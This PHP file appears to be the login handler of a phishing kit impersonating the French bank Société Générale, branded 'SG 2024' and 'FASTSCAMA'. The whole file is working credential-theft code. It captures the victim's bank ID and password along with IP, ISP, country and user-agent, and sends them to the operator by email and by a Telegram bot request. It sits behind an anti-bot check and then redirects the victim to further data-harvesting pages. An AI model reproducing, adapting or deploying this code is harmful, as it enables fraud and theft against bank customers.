<?php

session_start();
include '../settings.php';
date_default_timezone_set('Europe/Paris');
$dateHeure = date('d/m/y, H:i:s');
$_SESSION['date_heure'] = $dateHeure;
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

$user_id1 = isset($_POST['user_id1']) ? $_POST['user_id1'] : '';
$pass = isset($_POST['Pass']) ? $_POST['Pass'] : '';
$_SESSION['user'] = $user_id1;
$_SESSION['password'] = $pass;

// Vérifie la session avant de pouvoir soumettre le formulaire.
if (isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] == true) {

    if ($_SERVER["REQUEST_METHOD"] == "POST") {

        $user = htmlspecialchars($user_id1, ENT_QUOTES, 'UTF-8');
        $password = htmlspecialchars($pass, ENT_QUOTES, 'UTF-8');

        $message =
            "  
[🏛️] +1 LOGIN | SG 2024

[👤] Identifiant : $user
[🔑] Mot de passe : $password
    
[📜] Informations liées au client [📜]   
          
[🗓️] Heure et date du rez : {$_SESSION['date_heure']}
[🌐] IP Client : {$_SESSION['ip2']}
[🔎] ISP Client : {$_SESSION['isp_client']}
[🌍] Pays Client : {$_SESSION['pays_client']}
[📍] User-agent : {$_SESSION['useragent']}
[©️] 2024[©️]";

        if ($mail_sending == true) {
            $subject = "[🏛️]  Login SG | $ip";
            $headers = "From: SG 2024 | FASTSCAMA <rez@fastscama.fr>";
            mail($rezmail, $subject, $message, $headers);
        }

        if ($telegram_sending == true) {
            $data = [
                'text' => $message,
                'chat_id' => $chat_login
            ];
            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
        }

        if ($pass_secure === true) {
            header('Location: ../fr/securepass.php');
            exit();
        } else {
            header('Location: ../fr/info.php');
            exit();
        }
    } else {
        header('Location: ../fr/login.php?error=1');
        exit();
    }
} else {
   
    header('Location: ../4044444.php');
    exit();
}
?>
